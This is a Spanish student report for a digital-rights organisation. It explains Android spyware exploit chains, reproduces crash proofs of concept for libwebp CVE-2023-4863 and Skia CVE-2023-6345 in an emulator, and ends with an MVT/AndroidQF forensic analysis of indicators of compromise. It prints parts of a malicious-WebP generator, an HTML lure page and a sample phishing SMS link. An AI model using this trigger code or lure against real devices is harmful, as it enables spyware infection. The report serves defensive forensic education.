# Proyecto de Aplicación Profesional en SOCIALTIC
![img_2.png](imgs/img_2.png)

Autor: Santiago I. López

Contacto: ismael.lopez@iteso.mx

Mayo x, 2026

Supervisor: Paúl Aguilar

# Introducción

En la presente era digital, tener un dispositivo movil se ha vuelto indispensable. Nos han facilitado varios aspectos de 
nuestra vida, como la comunicación, traslado, banca, entretenimiento, entre más cosas. Por consecuencia, nuestros dispositivos
móviles se han convertido en extensiones de nuestra vida privada, albergando desde conversaciones íntimas hasta datos
más sensibles como la ubicación y salud. El presente reporte tiene como objetivo explicar qué son las
cadenas de explotación (_exploit chains_), cómo se utilizan para vulnerar nuestra privacidad y qué acciones podemos tomar 
a partir de los hallazgos.

# Cadenas de Ataque

Para que un software espía, ahora _spyware_, logre tomar el control total de un teléfono de manera remota, no basta con solo una falla den la seguridad.
Los atacantes deben de encadenar varios fallos, ahora _exploits_, para evadir las defensas del sistema. Una cadena de explotación
se compone generalmente de tres pasos

### 1. Ejecución Remota de Código "_RCE_"
Es el primer paso, el atacante logra ejecutar instrucciones en el dispositivo a distancia, son usualmente en páginas web
comprometidas o en fallas dentro de los servicios de mensajería.

### 2. Escape del _Sandbox_ "_SBX_"
Las aplicaciones de la actualidad funconan en entornos aislados (_sandbox_) para que, si presenta una falla, no afecte el sistema. 
Además, sirve como una medida de seguridad por si llega a vulnerarse una aplicación. El atacante debe de usar un segundo exploit
para salir del aislamiento y ganar más acceso

### 3. Escalada de Privilegios Locales "_LPE_"
El paso final, aquí el atacante obtiene permisos de super usuario, o _root_, lo que le permite instalar el _spyware_ de manera
permanente y persistente.

## Impacto en la Ciudadanía
Este fenómeno no es ajeno a países donde la vigilancia y censura es mayor. En México se han documentado el uso de cadenas contra
científicos que promovían impuestos a bebidas azucaradas [1](https://citizenlab.ca/research/bittersweet-nso-mexico-spyware/),
defensores de derechos humanos que investigan desapariciones y periodistas que denuncian la corrupción [2](https://ejercitoespia.r3d.mx/ejercito-espia/)
Mientras que inicialmente estas cadenas requerían la interacción mínima con el usuario, como dar clic en un enlace, las cadenas
han evolucionado para que ocurran de manera silenciosa, sin que la víctima se de cuenta de dónde pudo ser infectado. (_0-click_)

# Ejemplo de Cadena de Ataque

Se conceptualizó una cadena de ataque de tipo “1 clic”, es decir, que sí requiere interacción con la víctima, pero es mínima. 
La cadena empieza con la víctima recibiendo un enlace a través de diversos medios de comunicación, esta incluye los 
servicios de mensajería, redes sociales, correo electrónico, etc. El mensaje tiene un contenido que asegura que la 
persona entre al vínculo, que lo lleva a una página web maliciosa. El ambiente donde se desarrollaron las pruebas 
de concepto fue en Android Studio. Se utilizó una imagen de Android Open Source Project debido a que las versiones que 
incluían Google Play ya venían con los parches de seguridad.


## Primer Paso - CVE-2023-4863 "LibWebP Buffer Overflow"

CVE-2023-4863 Es una vulnerabilidad de tipo Heap Buffer Overflow para la librería de LibWebP. Ocurre durante el
renderizado de imagenes en Chrome. Sus efectos principales incluyen la corrupción de memoria en el área y un RCE
limitado al sandbox.

### Secuencia de Explotación

El formato WebP sin pérdida (VP8L) utiliza la codificación Huffman para reducir el tamaño de los archivos. Para que el 
proceso de decodificación sea eficiente en dispositivos móviles, la librería libwebp previó a 1.3.2 empleaba tablas de 
búsquedas calculadas previamente en la memoria en vez de utilizar estructuras de árbol binarios tradicionales. Estas 
tablas ya calculadas permiten traducir rápidamente los bits de entrada en los símbolos correspondientes.

El fallo se encuentra en la función BuildHuffmanTable del decodificador VP8L. Esta función es encargada de validar los 
códigos Huffman y organizar la estructura de la tabla de búsqueda en la memoria asignada. Libwebp utiliza un array de 
tamaños previamente calculados llamado kTableSize para determinar cuánta memoria asignar en el heap para las tablas ya 
calculadas. Este array solo tiene en cuenta los tamaños para búsquedas de primer nivel de 8 bits, ignorando las tablas 
de segundo nivel necesarias para códigos más largos. Aunque libwebp permite códigos de hasta 15 bits, el búfer 
preasignado no contempla el espacio adicional para estos desbordamientos de nivel.

Ahora bien, el ataque viene por medio de un árbol Huffman extremadamente desequilibrado. El proceso es el siguiente:

Los datos de la imagen se organizan en cinco “segmentos de alfabeto”, que son las características de los colores: verde, 
rojo, azul, alpha y distancia, cada uno con su propia tabla de búsqueda. Al manipular el tamaño de los códigos en estos 
segmentos, el atacante logra agotar la memoria del heap. Durante el procesamiento del último alfabeto (distancia), la 
función “ReplicateValue”, intenta realizar un OOB write del búfer de huffman_tables. Por último, lo que queda es tomar 
control de los pointers para lograr un RCE.
Esta vulnerabilidad afecta a todas las versiones de Android desde la 11 hasta la 14 previo al parche de seguridad del 6 
de octubre de 2023. Las versiones de Chrome vulnerable son previas a la versión 116.0.5845.187.

### Prueba de Concepto

#### Codigo para Generar la Imagen

Para probar el PoC, se utilizó el código de [DarkNavy “gen_oob_webp.py”](https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2023-4863/gen_oob_webp.py). Este código genera manualmente un archivo .webp 
construyendo cada parte de la imagen bit por bit. El resultado final es un archivo de nombre “oob.webp”, diseñado para 
provocar un error en el proceso de decodificación en WebP, específicamente un out-of-bounds (oob) write en el heap.
A grandes rasgos, el código se puede dividir en cinco bloques

#### Construcción de Bitstreams
El formato VP8L lossless almacena varios valores bit a bit, usando un orden de bits invertido (LSB-first).
El siguiente segmento de código define el método para construir los datos con estos requerimientos:

```python
def bit(val, len=-1):
    if len == -1:
        return bin(val)[2:][::-1]
    else:
        return bin(val)[2:].zfill(len)[::-1]
```
Esta función convierte un numero a binario, lo rellena a una longitud especifica e invierte el orden de los bits.
Luego, en otra función, los bits se convierten en bytes:

```python
def bitstream_to_bytearray(bitstream: str) -> bytearray:
    # Pad the bitstream to make its length a multiple of 8
    while len(bitstream) % 8 != 0:
        bitstream += "0"

    # Convert bitstream to bytearray
    byte_array = bytearray()
    for i in range(0, len(bitstream), 8):
        byte_chunk = bitstream[i : i + 8][::-1]
        byte_value = int(byte_chunk, 2)
        byte_array.append(byte_value)

    return byte_array
```
Ambas permiten construir el flujo de bits de la imagen WebP.

#### Construcción del Contenedor WebP
El archivo WebP se basa en el contenedor _RIFF_. El código crea este encabezado manualmente en la siguiente sección:
```python
RIFF_header = b"RIFF"
RIFF_header += pack("I", webp_chunk_size)
RIFF_header += b"WEBPVP8L"
RIFF_header += pack("I", lossless_stream_size)
```
Esto produce un archivo con la estructura válida y reconocible por los sistemas

#### Construcción de Tablas de Compresión

Como descrito en la explicación teórica, el formato VP8L usa codificación Huffman para comprimir los datos de imagen. 
El script construye manualmente las longitudes de estos códigos, ejemplo del código:
```python
code_length_green = bit(0)
code_length_green += (
    "0000" * 1
    + "1000" * 235
    + "1001" * 37
    + "1010"
    + "1011"
    + "1100"
    + "1101" * 64
    + "1110" * 4
)
code_length_red = bit(0)
code_length_red += (
    "0000"
    + "0001"
    + "1000" * 67
    + "1001" * 117
    + "1010"
    + "1011"
    + "1100"
    + "1101" * 65
    + "1110" * 2
)
code_length_dist = bit(0)
```
#### Inserción de la Secuencia que Provoca la Corrupción de Memoria

La función encargada de esto es:
```python
def overwrite(offset, value=0x27)
```
Ésta construye una secuencia de bits diseñada para que el decodificador interprete incorrectamente las tablas de Huffman
calcule offsets erróneos y termine escribiendo datos fuera del heap. El resultado se inserta en el flujo comprimido en 
la siguiente línea:
```python
code_length_dist += overwrite(0, 3)
```

#### Ensamblado Final del Archivo
Finalmente, el código combina todos los componentes y escribe el archivo final *"oob.webp"*
```python
image = bytearray()
image.extend(RIFF_header)
image.extend(image_header)
image.extend(image_stream)

webp_chunk_size = len(image) - 8
lossless_stream_size = webp_chunk_size - 13

# edit image's size
image[4:8] = pack("I", webp_chunk_size)
image[16:20] = pack("I", lossless_stream_size)

print(image)
with open("oob.webp", "wb") as f:
    f.write(image)
```

#### Modificación al PoC
Se agregó una función en el código para generar una imagen que sí causara el crash dentro del navegador del dispositivo 
emulado. Originalmente tiene un tamaño lógico de 1x1 bits

![img.png](imgs/img.png)

Fue posible aumentar el tamaño lógico de la imagen modificando el header de VPL8. Originalmente, esto ocurre en la 
siguiente porción de código:

```python
image_header = b"\x2f"
image_header += bitstream_to_bytearray("0" * 28 + "1000")
```
Éste incluye el ancho (width), largo (height), Alpha flag, y la versión.
Sin embargo, esto es reemplazado parcialmente por una nueva función “_nuevo_header()_”
```python
def nuevo_header(width, height):
    width_bits = bit(width - 1, 14)
    height_bits = bit(height - 1, 14)
    alpha = bit(0, 1)
    version = bit(0, 3)

    bitstream = width_bits + height_bits + alpha + version
    return b"\x2f" + bitstream_to_bytearray(bitstream)
```
El formato no guarda directamente el ancho y alto, sino el valor menos uno, usando 14 bits para cada dimensión. El 
método bit(, 14) convierte el valor en 14 bits invertidos (LSB-first), que es el orden usado por VP8L. Después se añaden
los campos de Alpha y versión para completar los requerimientos. Al final, todos los campos se concatenan para formar 
el encabezado. El orden es importante ya que sigue la estructura definida para el formato:

| Campo            | Tamaño  |
|------------------|---------|
| Width-1 [ANCHO]  | 14 bits |
| Height-1 [LARGO] | 14 bits |
| ALPHA            | 1 bit   |
| VERSION          | 3 bits  |

#### Ejecución del PoC
Se creó el siguiente HTML para demostrar el crasheo:
```html
<html>
<body>

<h2>NOTICIA DE ULTIMO MOMENTO</h2>

<script>
    for (let i = 0; i < 2; i++) {
        let img = document.createElement("img");
        img.src = "big_bad.webp?cache=" + Math.random();
        document.body.appendChild(img); }
    window.location.href = 'exptest.html';
</script>

</body>
</html>
```
Después, se creó el servidor básico de HTTP utilizando el comando de python:
```bash
python3 -m http.server 8000
```

Desde el Android Studio, se accede al Chrome vulnerable previamente instalado. Se accede a la IP de la máquina virtual 
al puerto 8000 y se accede al archivo HTML. Al principio no sucede algo, sin embargo, al recargar la página se ve lo 
siguiente:

![img.png](imgs/img_3.png)

Y al revisar logcat, se encuentra lo siguiente el crash con la señal SIGSEGV código 1 (SEGV_MAPERR), además de 
confirmación de que el proceso del sandbox de Chrome murió

![img.png](imgs/img_4.png)
![img.png](imgs/img_5.png)

Al mostrar que el sandbox process murió, se confirma el correcto funcionamiento parcial del PoC de CVE-2023-4863.

## Segundo Paso - CVE-2023-6345 “SKIA INTEGER OVERFLOW”

CVE-2023-6345 es una vulnerabilidad crítica que afectó el motor gráfico de SKIA en Google Chrome, impactando 
principalmente a dispositivos Android y otros sistemas basados en Chromium.

Esta vulnerabilidad es un desbordamiento de enteros que puede permitir un escape del sandbox y suele ser parte de 
una cadena. Primero, el atacante compromete el proceso de renderizado, y luego usa esta vulnerabilidad para saltar al 
siguiente paso

### Secuencia de Explotación

El proceso comienza cuando la librería intenta dibujar una imagen que contiene múltiples operaciones 
“DRAW_VERTICES_OBJECT”. Estas operaciones se utilizan para renderizar gráficos complejos mediante “mallas” de vértices.

Para ser más eficiente, SKIA utiliza otra función llamada “_MeshOp::onCombineIfPossible_”. Su trabajo es combinar la 
operación de la malla actual con las siguientes para procesarlas juntas. Durante el proceso, la función suma los 
recuentos de vértices e índices con las variables _fVertexCount_ y _fIndexCount_ respectivamente, de ambas operaciones.

El error viene en que _fVertexCount_ está definido como un entero de 32 bits. La función _onCombineIfPossible_ suma los 
valores de las mallas sin verificar si el resultado supera el límite que un entero de 32 bits puede almacenar. Cuando la 
suma excede, ocurre un _wrap-around_, resultando en un número más pequeño que el que debería ser.

Después, en una siguiente operación “_MeshOp::onPrepareDraws_”, el sistema reserva un búfer de memoria 
(un “_skgpu::VertexWriter_”) basado en el número erróneo de la función anterior. En este punto, el espacio de memoria 
reservado es insuficiente para contener todos los datos.

Finalmente, el sistema procede a escribir los vértices de cada malla individual en el búfer asignado. Como el búfer es 
de espacio insuficiente, los datos empiezan a escribir fuera de los límites, invadiendo el heap. En una ejecución normal 
de seguridad, el proceso se detendría, pero en las versiones comerciales de Chrome se eliminan por rendimiento. El 
atacante puede manipular este desbordamiento para sobreescribir objetos en la memoria, efectivamente ejecutando código 
fuera del sandbox.

Desafortunadamente, no se encontraron PoCs funcionales para emuladores móviles que involucren CVE-2023-6345. El más 
cercano proviene de 
[Google Project 0](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2023/CVE-2023-6345.html), pero 
utiliza la librería directamente para demostrarlo en lugar de una prueba recreable en dispositivos.

### Prueba de Concepto

Primero, se compila SKIA con ASAN, para que los mensajes vengan con más contexto. Después, se genera un script para 
crear una imagen .skp. Un archivo .skp es una grabación de comandos de dibujo. En lugar de guardar una imagen como tal,
guarda instrucciones para crear dicha imagen; cuando Chrome lo abre, reproduce estas instrucciones.

El código proporcionado por el artículo genera manualmente un .skp válido, pero con datos específicos para forzar a SKIA
 a calcular mal el tamaño de memoria necesario. El script consta de diferentes secciones:
- Header
- Factory
- Buffers (Paint & Vertices)
- Reader
- EOF

#### Header

El header hace que el archivo se haga válido para SKIA

```bash
info = b'skiapict'
info += p32(kSkBlenderInSkPaint)
info += f32(0)  # left
info += f32(0)  # top
info += f32(30) # right
info += f32(30) # bottom
```

Este define el tipo de archivo, la versión y las dimensiones del canvas

#### Factory

Esta parte define objetos qye sib necesarios para cumplir con el formato:

```bash
factory = tag('fact')
factory += p32(1)
factory += p32(1)
factory += p8(len(name)) 
factory += name
```

#### Paint Buffer

Configura las propiedades del dibujo

#### Vertices Buffer

Es en este apartado donde comienza la preparación del exploit. El archivo define una gran cantidad de vertices:
```bash
vertexCount = 1 << 16  # ¡65536 vertices!
```
Esto tiene diversos efectos, como aumentar el tamaño de los datos a procesar y amplifica cualquier otro cálculo que se 
base en este valor.

#### Reader
Esta es la sección que hace _trigger_ a la vulnerabilidad. En ella se tienen instrucciones de dibujo repetidas.
```bash
reader_ops = reader_op * (INT32_MAX // vertexCount + 1)
```
El +1 es el que termina provocando el overflow.

El fallo ocurre al SKIA calcularo cuánta memoria debería usar:
```bash
total_size = op_count * vertexCount;
```
Ambos valores son enormes, lo que produce el overflow de entero, el resultado se envuelve y se obtiene un número
incorrectamente pequeño

Al tener la librería con ASAN compilada y el archivo .skp, se procede a parsear la imagen SKIA:

```bash
$ ./skia/out/asan/skpbench --src poc.skp --config gles
```

Lo que regresa el siguiente resultado:
```bash
   accum    median       max       min   stddev  samples  sample_ms  clock  metric  config    bench  
../../src/gpu/ganesh/ops/DrawMeshOp.cpp:1225:18: runtime error: signed integer overflow: 2146435072 + 1048576 cannot be represented in type 'int'  
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ../../src/gpu/ganesh/ops/DrawMeshOp.cpp:1225:18 in
```

## Tercer Paso - CVE -

# Análisis Forense

Primero, se volvió a crear un entorno en blanco para lograr observar los efectos, esto se hace debido a que el anterior
dispositivo fue parte del desarrollo del PoC y, por lo tanto, tuvo varios errores que pueden afectar un análisis de la
prueba final.
![img_1.png](imgs/sigsys31.png)

Después, se instaló el apk del Chrome vulnerable. Se obtuvo del sitio APKmirror, la versión exacta fue 116.0.5845.114.
Una vez con el apk, se le instaló directamente al dispositivo con

```bash
adb install chrome_vulnerable.apk
```
La extracción se creó en base al _how-to_ publicado por [SocialTIC](https://forensics.socialtic.org/how-tos/04-how-to-extract-with-androidqf/index.html).
Con Chrome instalado, se descargaron los binarios directamente del repositorio de la herramienta [AndroidQF](https://github.com/mvt-project/androidqf/)

Se ejecutó luego esta aplicación. Como es un dispositivo virtual, y hasta cierto punto “desechable”, se optó por no 
realizar una copia de seguridad, sin embargo, se recomienda hacerlo cuando se trate de un dispositivo real.

![androidqf.png](imgs/androidqf.png)

Se siguió el proceso de verificación, asegurando que los errores se mantengan a eventos no relevantes en command.log. 
Luego, se pasó al archivo aquisition.json y se confirmó que su contenido sea adecuado

![aquisitionjson.png](imgs/aquisitionjson.png)


Por último, se comprobó la creación de todos los archivos esperados:
![comparison.png](imgs/comparison.png)
*A la izquierda, archivos y carpetas esperados, derecha los generados.*

Al hacer la comparación y que estén igual, se pone en marcha la cadena.

![crash.png](imgs/crash.png)

*Crash de CVE-2023-4863*

Una vez finalizado, se repite el mismo proceso para realizar la extracción ahora del emulador atacado.

![result.png](imgs/result.png)

*Ambas extracciones, empezando con a09 es el limpio, 63f es el post explotación*

Una vez se cuentan con ambas extracciones ya es posible hacer un análisis. Sin embargo, para más claridad sobre los IOCs,
se utilizó la herramienta de MVT. 

## Command.log

Command.log es un archivo que se genera después de que mvt termine de analizar los archivos en manera de resumen. Lo 
siguiente fue lo más interesante que se encontró dentro del archivo *command.log*

```bash
mvt.android.modules.androidqf.aqf_packages - WARNING - Found a non-system package installed via adb or another method: "com.android.chrome"
```

En ambos archivos se encuentra la instalación de chrome por adb. En el presente caso, se instaló la versión antigua de Chrome
, si se encontrara otro de paquetes instalados por adb sin que lo reconozca la víctima, se trataría de un indicador de
compromiso importante.

Otro warning informa que no cuenta con parches de seguridad recientes. De ser un celular regular, sería prioritario actualizarlo
y sospechar de una infección.

```bash
mvt.android.modules.androidqf.aqf_getprop - INFO - ro.build.version.security_patch: 2021-08-05
mvt.android.modules.androidqf.aqf_getprop - WARNING - This phone has not received security updates for more than six months (last update: 2021-08-05)
```
Lo siguiente es de esperar al utilizar un emulador, pero si se enucnetra otro tipo de aplicaciones, es importante investigar más
del tema.

```bash
mvt.android.modules.bugreport.dumpsys_receivers - INFO - Found a receiver to intercept incoming SMS messages: "com.android.messaging/.receiver.SmsReceiver"
mvt.android.modules.bugreport.dumpsys_receivers - INFO - Found a receiver to intercept incoming SMS messages: "com.android.messaging/.receiver.AbortSmsReceiver"
mvt.android.modules.bugreport.dumpsys_receivers - INFO - Found a receiver monitoring outgoing calls: "com.android.dialer/.interactions.UndemoteOutgoingCallReceiver"
```

Lo siguiente también se espera por utilizar la plataforma de Android Studio, sin embargo, un dispositivo movil que cuente
con multimples llaves adb es preocupante y se debe de asumir una infección.

```bash
mvt.android.modules.bugreport.dumpsys_adb_state - DEBUG - Found trusted ADB key for user 'xxxxx' with fingerprint 'E6:E0:7A:34:8C:73:84:72:D6:00:29:28:82:74:B5:26'
mvt.android.modules.bugreport.dumpsys_adb_state - DEBUG - Found trusted ADB key for user 'version='1.0' encoding='utf-8' standalone='yes' ?>' with fingerprint ''
mvt.android.modules.bugreport.dumpsys_adb_state - DEBUG - Found trusted ADB key for user 'version="1">' with fingerprint '7F:B6:CB:8D:54:D2:69:03:4E:61:D9:78:1E:DD:F7:5A'
mvt.android.modules.bugreport.dumpsys_adb_state - DEBUG - Found trusted ADB key for user 'key="QAAAADPanNcFT/6MMXTyuTXHCT7fW9OCL6yAUOTBpfcLthpxEJw7FrKheNwgvHlxfyzapjsmtPMo9KKIJyLtiB/TWToeoF4c9TcqAV7WP9zcSZdfcpoHrBEu98dBfb9Gr/3AqG/HHD4otueSCSDsirNUCR3Oq8AkIk3P3+KIMyAD0bYu+PvH1UPuUuZIVQtQb7VRMOwjCgde1u3Y7KgHJJX86eeGUGSlMaIf7X+vs8286u3rrxWDQmKqfe4pxBXbW+M250LANILrTt0TKSrOCQg2TBq8UuQVcnwcLj2dEzo8JlsCfdt0TTVzHQmcCMvMMqDBw/TT+ACC00l9+uSxoAcEYgDdZhquN6r5nVMn4eUUt7eH4PyQ/296II8J+6Simn0Ln6bKTZyMr653EHGHgFFzZBkOIzTDVTAg++GNKUDpvDkwQaQBTgv0w9R3YNIAfjbyTZayOtlz71JhdAqhS3ebO41cwu2nRI5uu/bst/fZZeOYpa6zL2Gk7kQlLopZMDN1bFtx5MizlbkRD/OkebLYDLkep7ILedBa5FhFcAcGtXbFQpC97WMPRXpLppBCjwwQKUfg5CVIaZHLgs2+cx7vm5xeaPA/qYOeO8MihkMRgXRZCvLuZDV9RljnKP1UlzCc3hPx+mCpHOFUUJNX1F9sDoPMelpKxUdUv3tPJ0k81ozRvNuRoQEAAQA= santl@88UACE" lastConnection="1777046168517" />' with fingerprint ''
mvt.android.modules.bugreport.dumpsys_adb_state - DEBUG - Found trusted ADB key for user '' with fingerprint ''
mvt.android.modules.bugreport.dumpsys_adb_state - DEBUG - Found trusted ADB key for user 'android-eng@google.com' with fingerprint ''
```

Los tombstones son archivos generados al ocurrir un crash. Los crashes pueden ocurrir por varisos motivos, pero también llegan
a ser indicadores de compromiso. Se deben analizar para determinar si son consecuencia de un ataque, o simplemente fallos
reales de aplicaciones.

```bash
mvt.android.modules.bugreport.tombstones - INFO - Running module Tombstones...
mvt.android.modules.bugreport.tombstones - INFO - Extracted a total of 3 tombstone files
mvt.android.modules.bugreport.tombstones - INFO - The Tombstones module produced no detections!
```

Los SMS pueden ser la puerta de entrada al ataque, siendo el primer paso al la víctima entrar a un hipervínculo desconocido

```bash
mvt.android.modules.backup.sms - INFO - Extracted a total of 2 SMS & MMS messages
```
## Archivos generados por MVT

### AQF Packages detected
Este archivo contiene cualquier aplicación extra al sistema. Como visto anteriormente, el único instalado es Chrome. Es
de importancia notar las últimas lineas. "system:false" muestra que no cuenta con privilegios de sistema. De tenerlos, y 
que siga siendo de un *third party* sería un indicador.
```json
    {
        "name": "com.android.chrome",
        "files": [
            {
                "path": "/data/app/~~Lhc5M7ESJ1S3ZDO6guxong==/com.android.chrome-NvLvTtE7eZZa2N-2u63wCw==/base.apk",
                "local_name": "",
                "md5": "1ebdc7b6480665d348941e9bdb86d45f",
                "sha1": "217f97213b757af13b4d5531e651e78ef5035e00",
                "sha256": "d06cd8350bcec30e87d2d8555f0dbc2f31b53873f644f86e1e2dcdace41923bf",
                "sha512": "0e8ffc5fba770eee2b2b3c326f629007d3d887b012b9df3d64d1bc37100c653f812a8485477b2f133586c8c113a8b766dceca325a869a829ad36c32897c7f927",
                "error": "",
                "verified_certificate": true,
                "certificate": {
                    "Md5": "cde9f6208d672b54b1dacc0b7029f5eb",
                    "Sha1": "38918a453d07199354f8b19af05ec6562ced5788",
                    "Sha256": "f0fd6c5b410f25cb25c3b53346c8972fae30f8ee7411df910480ad6b2d60db83",
                    "ValidFrom": "2008-08-21T23:13:34Z",
                    "ValidTo": "2036-01-07T23:13:34Z",
                    "Issuer": "C=US, ST=California, L=Mountain View, O=Google Inc., OU=Android, CN=Android",
                    "Subject": "C=US, ST=California, L=Mountain View, O=Google Inc., OU=Android, CN=Android",
                    "SignatureAlgorithm": "MD5-RSA",
                    "SerialNumber": 14042372374541250701
                },
                "certificate_error": "",
                "trusted_certificate": true
            }
        ],
        "installer": "null",
        "uid": 10130,
        "disabled": false,
        "system": false,
        "third_party": true
    }
```
### Dumpsys Packages

Otro archivo a revisar sería *dumpsys_packages.json*. En este se describen todas las aplicaciones en los dispositivos
y los permisos con los que cuentan. Es importante revisarlo por si se encuentra una aplicación con un número de permisos
otorgados sospechosos. En este caso, no se encontró software maligno. Se comparte el formato del documento:
```json
    {
 "package_name": "com.android.printservice.recommendation",
 "uid": "10085",
 "version_name": "1.3.0",
 "version_code": "4 minSdk=30 targetSdk=30",
 "timestamp": "2023-05-04 16:11:22",
 "first_install_time": "2023-05-04 16:11:22",
 "last_update_time": "2023-05-04 16:11:22",
 "permissions": [
  {
   "name": "android.permission.CHANGE_WIFI_MULTICAST_STATE",
   "granted": true,
   "type": "install"
  },
  {
   "name": "android.permission.INTERNET",
   "granted": true,
   "type": "install"
  }
 ],
 "requested_permissions": []
}
```
### Root Binaries Detected
Este archivo registra la presencia de binarios asociados a privilegios elevados en el sistema. En este caso, el 
contenido indica que se ha detectado el binario *su* en la ruta /system/xbin/su, el cual es conocido como “SuperUser binary” y 
permite la ejecución de comandos con permisos de administrador. Su presencia sugiere que el entorno 
cuenta con acceso root o ha sido modificado para permitir elevación de privilegios, lo cual puede ser relevante 
otro contexto del análisis, ya que implica un estado no estándar del sistema que podría indicar posibles manipulaciones. 
Aunque en este contexto se debe a que se utilizó el telefono *rooteado* para permitirciertos permisos para la reproducción 
del primera ataque.
```json
[
 {
  "path": "/system/xbin/su",
  "binary_name": "su",
  "description": "SuperUser binary"
 }
]
```
### SMS

Contiene registros de mensajes SMS asociados al dispositivo. En este caso, el contenido muestra un mensaje recibido desde
un numero “10” con un texto que intenta inducir al usuario a acceder a un enlace externo bajo un mensaje engañoso
(“Apareciste en esta noticia como infiel”). El mensaje incluye una URL potencialmente maliciosa:
"https://login.c1ic.link/root_zwWzuP_video_player_update.php", lo que sugiere que se trate de phishing. La marca 
*isodate* indica cuándo fue recibido, importante para generar la línea del tiempo
```json
{
 "address": "10",
 "body": "Apareciste en esta noticia como infiel!\nhttps://web-safe.link/NmlunV_digital_sign.vbs",
 "date": "1777046009854",
 "date_sent": "0",
 "status": "-1",
 "type": "2",
 "recipients": [
  "10"
 ],
 "read": "1",
 "isodate": "2026-04-24 15:53:29.854000",
 "direction": "received",
 "links": [
  "https://web-safe.link/NmlunV_digital_sign.vbs"
 ]
}
```
### Tombstones
Este registra los *crashes* de las aplicaciones, generalmente por una señal de sistema. En este contexto, se trata de 
una falla en el binario de Chrome. El error se trata de un "SIGSYS 31", que se genera cuando un proceso intenta
ejecutar una llamada al sistema no permitida.
```json
{
 "file_name": "tombstone_02",
 "file_timestamp": "2026-04-24 15:54:10.000000",
 "build_fingerprint": "Android/sdk_phone_x86_64/generic_x86_64:11/RSR1.210722.013.A2/10067904:userdebug/test-keys",
 "revision": "0",
 "arch": "x86",
 "timestamp": "2026-04-24 15:54:09.000000",
 "process_uptime": null,
 "command_line": null,
 "pid": 13012,
 "tid": 13012,
 "process_name": "main",
 "binary_path": "com.android.chrome",
 "selinux_label": null,
 "uid": 10130,
 "signal_info": {
  "code": 1,
  "code_name": "SYS_SECCOMP",
  "name": "SIGSYS",
  "number": 31
 },
 "cause": "seccomp prevented call to disallowed x86 system call 214",
 "extra": null
}
```

## Timeline de los hechos
### 2026-04-24 15:53:29.854000 - Llega el mensaje a la victima
"Apareciste en esta noticia como infiel!
https://web-safe.link/NmlunV_digital_sign.vbs"

La victima accede al enlace
### 2026-04-24 15:54:10.000000 - Crash por CVE-2023-4863
La vulnerabilidad crashea el navegador movil

# Conclusiones

## "Lo bueno"
Gracias a este Proyecto de Aplicación Profesional, me desarrollé en varios aspectos de mi persona. De lo técnico, utilicé 
y mejoré los conocimientos adquiridos en las clases de Ética y Vulnerabilidad de Sistemas I y II e Informática Forense, 
principalmente los temas de scripting, pentesting y comprensión lectora técnica. Del aspecto personal, me ayudó a comunicarme 
y escuchar de manera efectiva, además de ganar más conciencia sobre el ciber-espionaje en la era actual.
Aprendí que no siempre se cumple completamente con lo esperado, pero es mejor ser honesto y mostrar los avances a mentir. 
Al ser honesto, se desarrolló la confianza. Añadiendo a lo anterior, me ayudó a identificar que debo tener en cuenta el 
beneficio social dentro de cualquier trabajo en el futuro, priorizando mi ética sobre las decisiones que tomo.

## "Lo no tan bueno"
Surgieron múltiples problemas en el desarrollo de este proyecto. Uno de los más grandes fue la selección de las vulnerabilidades.
Aceptando mi error, debí de haber investigado no solo si existían las pruebas de concepto, pero que fueran aplicables a 
dispositivos moviles, ya que prácticamente todos los que escogí solo funcionaban en una versión desktop de Linux. Encontrar
la manera en la que funcionaran en el emulador tardó más tiempo del que esperaba, aunque no fue en vano, ya que aprendí varios
aspectos de los ataques de Buffer Overflow.

### Tombstones y Cambio de Error
El ataque inicial de libwebp funcionó, ocasionando un SIGSEGV 11 que era posible ver en el logcat, sin embargo, mostraba un gran
error que explicaba que Chrome no podía acceder al registro de tombstones:
``` bash
libc                    pid-8227                             E  failed to connect to tombstoned: Permission denied
```

Se intentaron varias alternativas, como reducir la memoria RAM y el heap a lo mínimo permisible e intentarlo en otras
versiones de Android compatibles con la vulnerabilidad. Ninguno de los anteriores métodos llegaron a los resultados esperados.

La solución para que generara tombstones fue la siguiente:
Para que el entorno fuera más permisivo, se mandaron los siguientes comandos:

``` bash
adb root
adb shell setenforce 0
```
El primero habilita la ejecución de comandos que necesitan privilegios elevados, y el segundo desactiva temporalmente el 
modo *enforcing* de SELinux, haciendo el sistema más flexible. Esto se creyó como el problema del envío de tombstones. 
Al cambiar esto, se permite su generación y acceso desde el proceso de Chrome, conteniendo información detallada de los 
crashes nativos.

A pesar de los cambios, el comportamiento esperado no se reprodujo de la misma manera que en situaciones anteriores. En 
lugar del crash  típico (SIGSEGV 11), se observó SIGSYS 31. Además, no mostraba información completa del fallo

![sigsys31](imgs/sigsys31.png)
Para evitar que el sandbox de Chrome limite la visibilidad, se configuró la aplicación para ejecutarse bajo un wrapper de logging.
``` bash
adb shell setprop wrap.com.android.chrome "logwrapper"
```
Después de este cambio se forzó el cierre de Chrome y se relanzó la aplicación. Al abrir, se observó el nuevo tipo de crash a detalle.
![shown_crash-png](imgs/SHOWN_CRASH.png)

Finalmente, el crash fue registrado correctamente y se guardó en los tombstones, permitiendo su extracción para análisis.
![tomb_saved](imgs/tomb_saved.png)

En conclusión, si bien no se terminó por desarrollar la cadena completa, se adquirieron diversos aprendizajes en todos 
los aspectos de mi persona. El PAP fue un reto significativo que exigía desarrollo aprendizajes constantes que dejaron 
un impacto en mi persona. Me siento satisfecho con lo desarrollado y más preparado para desarrollar otros proyectos.

# Referencias
